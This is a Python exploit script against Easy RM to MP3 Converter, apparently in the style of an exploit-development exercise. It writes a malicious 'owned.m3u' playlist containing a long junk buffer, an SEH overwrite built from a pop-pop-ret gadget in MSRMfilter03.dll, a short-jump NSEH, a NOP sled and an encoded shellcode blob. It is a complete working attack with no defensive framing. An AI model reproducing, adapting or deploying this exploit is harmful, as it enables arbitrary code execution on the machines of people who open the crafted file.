import sys
import struct
import os

class Exploit:
    @classmethod
    def conv(cls, addr):
        return(struct.pack("<I", addr))

    @classmethod 
    def write_payload_to_file(cls, payload):
        payload_file = os.getcwd() + "\\owned.m3u"

        print("[+] Writing malicious data to file.")

        try:
            with open(payload_file, 'wb+') as pf:
                pf.write(payload)

            print("[!] Done writing.")

        except:
            print("[X] Error writing to file.")
            sys.exit(1)

    @classmethod
    def execute(cls):
        # SEH chain of main thread
        # Address    SE handler
        # 00104780   DEADBEEF
        # CAFEBABE   *** CORRUPT ENTRY ***
        junk = b"\x41" * 45225

        # 0x1002d619 : pop ebx # pop eax # ret  |  {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll)
        ppr = cls.conv(0x1002d619)

        nop_sled = b"\x90" * 32

        shellcode =  b""
        shellcode += b"\xdd\xc1\xbb\x6d\x98\x42\x6c\xd9\x74\x24\xf4\x58\x33"
        shellcode += b"\xc9\xb1\x52\x31\x58\x17\x83\xe8\xfc\x03\x35\x8b\xa0"
        shellcode += b"\x99\x39\x43\xa6\x62\xc1\x94\xc7\xeb\x24\xa5\xc7\x88"
        shellcode += b"\x2d\x96\xf7\xdb\x63\x1b\x73\x89\x97\xa8\xf1\x06\x98"
        shellcode += b"\x19\xbf\x70\x97\x9a\xec\x41\xb6\x18\xef\x95\x18\x20"
        shellcode += b"\x20\xe8\x59\x65\x5d\x01\x0b\x3e\x29\xb4\xbb\x4b\x67"
        shellcode += b"\x05\x30\x07\x69\x0d\xa5\xd0\x88\x3c\x78\x6a\xd3\x9e"
        shellcode += b"\x7b\xbf\x6f\x97\x63\xdc\x4a\x61\x18\x16\x20\x70\xc8"
        shellcode += b"\x66\xc9\xdf\x35\x47\x38\x21\x72\x60\xa3\x54\x8a\x92"
        shellcode += b"\x5e\x6f\x49\xe8\x84\xfa\x49\x4a\x4e\x5c\xb5\x6a\x83"
        shellcode += b"\x3b\x3e\x60\x68\x4f\x18\x65\x6f\x9c\x13\x91\xe4\x23"
        shellcode += b"\xf3\x13\xbe\x07\xd7\x78\x64\x29\x4e\x25\xcb\x56\x90"
        shellcode += b"\x86\xb4\xf2\xdb\x2b\xa0\x8e\x86\x23\x05\xa3\x38\xb4"
        shellcode += b"\x01\xb4\x4b\x86\x8e\x6e\xc3\xaa\x47\xa9\x14\xcc\x7d"
        shellcode += b"\x0d\x8a\x33\x7e\x6e\x83\xf7\x2a\x3e\xbb\xde\x52\xd5"
        shellcode += b"\x3b\xde\x86\x7a\x6b\x70\x79\x3b\xdb\x30\x29\xd3\x31"
        shellcode += b"\xbf\x16\xc3\x3a\x15\x3f\x6e\xc1\xfe\x80\xc7\xcb\xa2"
        shellcode += b"\x68\x1a\xcb\x4b\x35\x93\x2d\x01\xd5\xf5\xe6\xbe\x4c"
        shellcode += b"\x5c\x7c\x5e\x90\x4a\xf9\x60\x1a\x79\xfe\x2f\xeb\xf4"
        shellcode += b"\xec\xd8\x1b\x43\x4e\x4e\x23\x79\xe6\x0c\xb6\xe6\xf6"
        shellcode += b"\x5b\xab\xb0\xa1\x0c\x1d\xc9\x27\xa1\x04\x63\x55\x38"
        shellcode += b"\xd0\x4c\xdd\xe7\x21\x52\xdc\x6a\x1d\x70\xce\xb2\x9e"
        shellcode += b"\x3c\xba\x6a\xc9\xea\x14\xcd\xa3\x5c\xce\x87\x18\x37"
        shellcode += b"\x86\x5e\x53\x88\xd0\x5e\xbe\x7e\x3c\xee\x17\xc7\x43"
        shellcode += b"\xdf\xff\xcf\x3c\x3d\x60\x2f\x97\x85\x80\xd2\x3d\xf0"
        shellcode += b"\x28\x4b\xd4\xb9\x34\x6c\x03\xfd\x40\xef\xa1\x7e\xb7"
        shellcode += b"\xef\xc0\x7b\xf3\xb7\x39\xf6\x6c\x52\x3d\xa5\x8d\x77"

        '''
        00104780   90               NOP
        00104781   90               NOP
        00104782   EB 08            JMP SHORT 0010478C ; jmp short 8 bytes
        00104784   19D6             SBB ESI,EDX
        00104786   0210             ADD DL,BYTE PTR DS:[EAX]
        00104788   90               NOP
        00104789   90               NOP
        0010478A   90               NOP
        0010478B   90               NOP
        0010478C   90               NOP
        '''
        nseh = cls.conv(0x08eb9090) # 2 nops then jump forward by 8 bytes
        seh = ppr

        payload =  b""
        payload += junk
        payload += nseh
        payload += seh
        payload += nop_sled
        payload += shellcode

        cls.write_payload_to_file(payload)

if __name__ == "__main__":
    Exploit.execute()